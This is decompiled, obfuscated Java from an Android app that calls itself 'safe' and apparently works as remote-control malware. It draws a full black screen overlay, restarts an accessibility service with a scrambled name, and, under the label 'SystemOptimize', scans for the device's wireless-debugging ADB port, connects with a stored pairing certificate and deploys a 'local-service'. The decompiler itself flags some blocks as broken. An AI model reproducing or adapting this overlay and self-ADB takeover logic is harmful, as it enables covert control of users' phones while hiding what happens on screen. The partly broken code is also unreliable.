package p000;

import android.graphics.drawable.Drawable;
import android.os.Build;
import android.view.View;
import android.widget.RelativeLayout;
import com.google.android.material.sidesheet.SideSheetBehavior;
import com.storm.safe.rock.service.InitWorkerService;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import java.io.File;
import kotlin.Pair;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: ag */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC0027ag implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f43650a0;

    /* renamed from: a1 */
    public final /* synthetic */ int f43651a1;

    /* renamed from: a2 */
    public final /* synthetic */ Object f43652a2;

    public /* synthetic */ RunnableC0027ag(Object obj, int i, int i2) {
        this.f43650a0 = i2;
        this.f43652a2 = obj;
        this.f43651a1 = i;
    }

    /* JADX WARN: Code restructure failed: missing block: B:120:0x0316, code lost:
    
        if (r3 == r2) goto L110;
     */
    /* JADX WARN: Code restructure failed: missing block: B:124:0x0320, code lost:
    
        if (r3 != r2) goto L111;
     */
    /* JADX WARN: Code restructure failed: missing block: B:126:0x0323, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:172:?, code lost:
    
        return;
     */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0134 A[Catch: all -> 0x0092, Exception -> 0x0095, TryCatch #7 {Exception -> 0x0095, blocks: (B:8:0x0039, B:11:0x0043, B:13:0x0068, B:15:0x0072, B:20:0x0098, B:22:0x00a5, B:24:0x00ab, B:26:0x00b8, B:28:0x00cd, B:30:0x00d3, B:38:0x010c, B:40:0x0117, B:41:0x012e, B:42:0x0133, B:43:0x0134, B:45:0x013f, B:47:0x0145, B:49:0x0158, B:54:0x01a9, B:57:0x01b2, B:62:0x01c1, B:64:0x01c7, B:66:0x01d2, B:71:0x0203, B:74:0x020c, B:75:0x0212, B:76:0x0217, B:58:0x01b8, B:59:0x01bd, B:77:0x0218, B:79:0x021e, B:80:0x0235, B:82:0x024d, B:83:0x0259, B:21:0x00a0), top: B:160:0x0039, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x01be  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0218 A[Catch: all -> 0x0092, Exception -> 0x0095, TryCatch #7 {Exception -> 0x0095, blocks: (B:8:0x0039, B:11:0x0043, B:13:0x0068, B:15:0x0072, B:20:0x0098, B:22:0x00a5, B:24:0x00ab, B:26:0x00b8, B:28:0x00cd, B:30:0x00d3, B:38:0x010c, B:40:0x0117, B:41:0x012e, B:42:0x0133, B:43:0x0134, B:45:0x013f, B:47:0x0145, B:49:0x0158, B:54:0x01a9, B:57:0x01b2, B:62:0x01c1, B:64:0x01c7, B:66:0x01d2, B:71:0x0203, B:74:0x020c, B:75:0x0212, B:76:0x0217, B:58:0x01b8, B:59:0x01bd, B:77:0x0218, B:79:0x021e, B:80:0x0235, B:82:0x024d, B:83:0x0259, B:21:0x00a0), top: B:160:0x0039, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x021e A[Catch: all -> 0x0092, Exception -> 0x0095, TryCatch #7 {Exception -> 0x0095, blocks: (B:8:0x0039, B:11:0x0043, B:13:0x0068, B:15:0x0072, B:20:0x0098, B:22:0x00a5, B:24:0x00ab, B:26:0x00b8, B:28:0x00cd, B:30:0x00d3, B:38:0x010c, B:40:0x0117, B:41:0x012e, B:42:0x0133, B:43:0x0134, B:45:0x013f, B:47:0x0145, B:49:0x0158, B:54:0x01a9, B:57:0x01b2, B:62:0x01c1, B:64:0x01c7, B:66:0x01d2, B:71:0x0203, B:74:0x020c, B:75:0x0212, B:76:0x0217, B:58:0x01b8, B:59:0x01bd, B:77:0x0218, B:79:0x021e, B:80:0x0235, B:82:0x024d, B:83:0x0259, B:21:0x00a0), top: B:160:0x0039, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0235 A[Catch: all -> 0x0092, Exception -> 0x0095, TryCatch #7 {Exception -> 0x0095, blocks: (B:8:0x0039, B:11:0x0043, B:13:0x0068, B:15:0x0072, B:20:0x0098, B:22:0x00a5, B:24:0x00ab, B:26:0x00b8, B:28:0x00cd, B:30:0x00d3, B:38:0x010c, B:40:0x0117, B:41:0x012e, B:42:0x0133, B:43:0x0134, B:45:0x013f, B:47:0x0145, B:49:0x0158, B:54:0x01a9, B:57:0x01b2, B:62:0x01c1, B:64:0x01c7, B:66:0x01d2, B:71:0x0203, B:74:0x020c, B:75:0x0212, B:76:0x0217, B:58:0x01b8, B:59:0x01bd, B:77:0x0218, B:79:0x021e, B:80:0x0235, B:82:0x024d, B:83:0x0259, B:21:0x00a0), top: B:160:0x0039, outer: #3 }] */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        RelativeLayout relativeLayout;
        dqtvuisjd dqtvuisjdVar;
        int i;
        boolean zM212045d3;
        int i2 = 1;
        switch (this.f43650a0) {
            case 0:
                C0032al c0032al = (C0032al) this.f43652a2;
                int i3 = this.f43651a1;
                t60.m214695b6(c0032al, "this$0");
                c0032al.m209817a6(i3 + 1);
                return;
            case 1:
                C0454ef c0454ef = (C0454ef) this.f43652a2;
                int i4 = this.f43651a1;
                try {
                    if (c0454ef.f55985a7) {
                        c0454ef.f55986a8 = AbstractC1117qo.m214413a9(i4, 0, v10.MASK);
                        if (!c0454ef.f55983a5 || (relativeLayout = c0454ef.f55980a2) == null) {
                            c0454ef.m212667a0();
                            c0454ef.m212669a2();
                            if (!c0454ef.f55983a5) {
                                t60.m214726f4("BlackScreenOverlay", "⚠️ 首次创建失败，500ms 后重试");
                                c0454ef.f55996b8.postDelayed(new RunnableC0436dz(c0454ef, i2), 500L);
                            }
                        } else {
                            relativeLayout.setBackgroundColor(-16777216);
                            Drawable background = relativeLayout.getBackground();
                            if (background != null) {
                                background.setAlpha(c0454ef.f55986a8);
                            }
                        }
                    }
                    return;
                } catch (Exception e) {
                    tz0.m214808a8("❌ 显示遮罩失败: ", e.getMessage(), "BlackScreenOverlay", e);
                    return;
                }
            case 2:
                InitWorkerService initWorkerService = (InitWorkerService) this.f43652a2;
                int i5 = this.f43651a1;
                InitWorkerService.C0278a0 c0278a0 = InitWorkerService.f52298a2;
                while (true) {
                    dqtvuisjdVar = null;
                    if (i2 < 51) {
                        try {
                            try {
                                dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                                if (c0290a0 != null) {
                                    dqtvuisjdVar = c0290a0;
                                } else {
                                    try {
                                        Thread.sleep(100L);
                                        i2++;
                                    } catch (InterruptedException unused) {
                                    }
                                }
                            } catch (Exception e2) {
                                t60.m214705c6("InitWorkerService", "❌ 重初始化执行失败", e2);
                                i = initWorkerService.f52302a1;
                                break;
                            }
                        } finally {
                            int i6 = initWorkerService.f52302a1;
                            if (i5 == i6) {
                                AbstractC0003a2.m44c5("✅ InitWorkerService 任务完成，停止自身(gen=", i5, ")", "InitWorkerService");
                                InitWorkerService.f52299a3 = false;
                                initWorkerService.stopSelf();
                            } else {
                                t60.m214714d6("InitWorkerService", AbstractC0003a2.m31b2("⏩ 旧 generation(", i5, ") 退出，新 generation(", i6, ") 仍在运行，不停止 Service"));
                            }
                        }
                    }
                }
                int i7 = initWorkerService.f52302a1;
                if (i5 == i7) {
                    if (dqtvuisjdVar != null) {
                        t60.m214714d6("InitWorkerService", "✅ 获取到无障碍服务实例，开始重初始化(gen=" + i5 + ")");
                        dqtvuisjdVar.m211498j2();
                    } else {
                        t60.m214726f4("InitWorkerService", "⚠️ 等待无障碍服务超时，跳过重初始化");
                    }
                    i = initWorkerService.f52302a1;
                    break;
                } else {
                    t60.m214726f4("InitWorkerService", "⚠️ generation 已过期(" + i5 + "→" + i7 + ")，跳过");
                    break;
                }
            case 3:
                ((cq0) this.f43652a2).mo212508c6(this.f43651a1);
                return;
            case 4:
                SideSheetBehavior sideSheetBehavior = (SideSheetBehavior) this.f43652a2;
                int i8 = this.f43651a1;
                View view = (View) sideSheetBehavior.f49795b4.get();
                if (view != null) {
                    sideSheetBehavior.m211102c0(view, i8, false);
                    return;
                }
                return;
            default:
                C0360a2 c0360a2 = (C0360a2) this.f43652a2;
                int i9 = this.f43651a1;
                if (c0360a2.f53858e3) {
                    t60.m214702c3("SystemOptimize", "【case0】#" + i9 + " 上一个 case0 仍在运行，跳过");
                    return;
                }
                c0360a2.f53858e3 = true;
                try {
                    try {
                        boolean zM214889a1 = v00.m214889a1();
                        if (!zM214889a1) {
                            t60.m214714d6("SystemOptimize", "【case0】#" + i9 + " firstDeployDone=" + c0360a2.f53852d7 + " localService=" + zM214889a1);
                            if (c0360a2.f53852d7) {
                                c0360a2.f53853d8.set(0);
                            } else if (c0360a2.f53853d8.get() < 12) {
                                c0360a2.f53853d8.incrementAndGet();
                                t60.m214702c3("SystemOptimize", "【case0】跳过 (" + c0360a2.f53853d8.get() + "/12)");
                            } else {
                                c0360a2.f53852d7 = true;
                                t60.m214714d6("SystemOptimize", "【case0】前12次跳过完成，开始工作");
                            }
                            File fileM212065g8 = c0360a2.m212065g8();
                            if (fileM212065g8 == null || !new File(fileM212065g8, "cert.pem").exists()) {
                                t60.m214702c3("SystemOptimize", "【case0】V()=false，未配对，跳过");
                            } else {
                                boolean zM212036b8 = c0360a2.m212036b8();
                                t60.m214714d6("SystemOptimize", "【case0】V()=true, D()=" + zM212036b8);
                                if (!zM212036b8) {
                                    int iM212064g7 = c0360a2.m212064g7();
                                    if (iM212064g7 <= 0 || !c0360a2.f53856e1.tryLock()) {
                                        t60.m214714d6("SystemOptimize", "【case0】L(): 开始...");
                                        if (Build.VERSION.SDK_INT < 30 || !c0360a2.m212073h8()) {
                                            zM212045d3 = false;
                                            if (zM212045d3 && !c0360a2.m212036b8()) {
                                                t60.m214714d6("SystemOptimize", "【case0】N(): 端口扫描...");
                                                int iM212085j3 = c0360a2.m212085j3();
                                                if (iM212085j3 > 0) {
                                                    c0360a2.m212091k0(iM212085j3);
                                                    t60.m214714d6("SystemOptimize", "【case0】N() 扫描到端口: " + iM212085j3);
                                                    if (c0360a2.f53856e1.tryLock()) {
                                                        try {
                                                            if (c0360a2.m212045d3(iM212085j3)) {
                                                                t60.m214714d6("SystemOptimize", "【case0】N() 连接成功 → X()");
                                                                c0360a2.f53854d9.set(0);
                                                                c0360a2.m212096k6(iM212085j3, C0360a2.m212018g5());
                                                                c0360a2.f53856e1.unlock();
                                                            } else {
                                                                c0360a2.f53856e1.unlock();
                                                                if (c0360a2.m212036b8()) {
                                                                }
                                                            }
                                                        } finally {
                                                        }
                                                    }
                                                }
                                            }
                                        } else {
                                            t60.m214714d6("SystemOptimize", "【case0】尝试 NSD 发现端口...");
                                            Pair pairM212053e1 = c0360a2.m212053e1();
                                            if (((Number) pairM212053e1.f57557a1).intValue() > 0) {
                                                c0360a2.f53839c4 = (String) pairM212053e1.f57556a0;
                                                c0360a2.m212091k0(((Number) pairM212053e1.f57557a1).intValue());
                                                t60.m214714d6("SystemOptimize", "【case0】NSD 发现端口: " + pairM212053e1.f57556a0 + ":" + pairM212053e1.f57557a1);
                                                if (c0360a2.f53856e1.tryLock()) {
                                                    try {
                                                        zM212045d3 = c0360a2.m212045d3(c0360a2.m212064g7());
                                                        if (zM212045d3) {
                                                            t60.m214714d6("SystemOptimize", "【case0】L() 连接成功 → X()");
                                                            c0360a2.f53854d9.set(0);
                                                            c0360a2.m212096k6(c0360a2.m212064g7(), c0360a2.f53839c4);
                                                            c0360a2.f53856e1.unlock();
                                                        } else {
                                                            c0360a2.f53856e1.unlock();
                                                        }
                                                    } finally {
                                                    }
                                                }
                                                if (zM212045d3) {
                                                    if (c0360a2.m212036b8()) {
                                                    }
                                                }
                                            }
                                        }
                                    } else {
                                        try {
                                            t60.m214714d6("SystemOptimize", "【case0】J(" + iM212064g7 + "): 用保存端口连接...");
                                            if (c0360a2.m212045d3(iM212064g7)) {
                                                t60.m214714d6("SystemOptimize", "【case0】J(" + iM212064g7 + "): 成功 → break");
                                            }
                                            c0360a2.f53856e1.unlock();
                                            if (c0360a2.m212036b8()) {
                                                c0360a2.f53854d9.set(0);
                                                t60.m214714d6("SystemOptimize", "【case0】J() 连接成功 → X()");
                                                c0360a2.m212096k6(c0360a2.m212064g7(), C0360a2.m212018g5());
                                            }
                                        } finally {
                                            c0360a2.f53856e1.unlock();
                                        }
                                    }
                                } else if (c0360a2.m212036b8()) {
                                    t60.m214714d6("SystemOptimize", "【case0】ADB已连接 → 部署 local-service");
                                    c0360a2.f53854d9.set(0);
                                    c0360a2.m212096k6(c0360a2.m212064g7(), C0360a2.m212018g5());
                                } else {
                                    int iIncrementAndGet = c0360a2.f53854d9.incrementAndGet();
                                    t60.m214726f4("SystemOptimize", "【case0】连接失败 failCount=" + iIncrementAndGet);
                                    if (iIncrementAndGet > 6) {
                                        t60.m214726f4("SystemOptimize", "【case0】失败>6次，重置计数器");
                                        c0360a2.f53854d9.set(0);
                                    }
                                }
                            }
                        }
                    } catch (Throwable th) {
                        c0360a2.f53858e3 = false;
                        throw th;
                    }
                } catch (Exception e3) {
                    t60.m214705c6("SystemOptimize", "【case0】异常", e3);
                }
                c0360a2.f53858e3 = false;
                return;
        }
    }
}
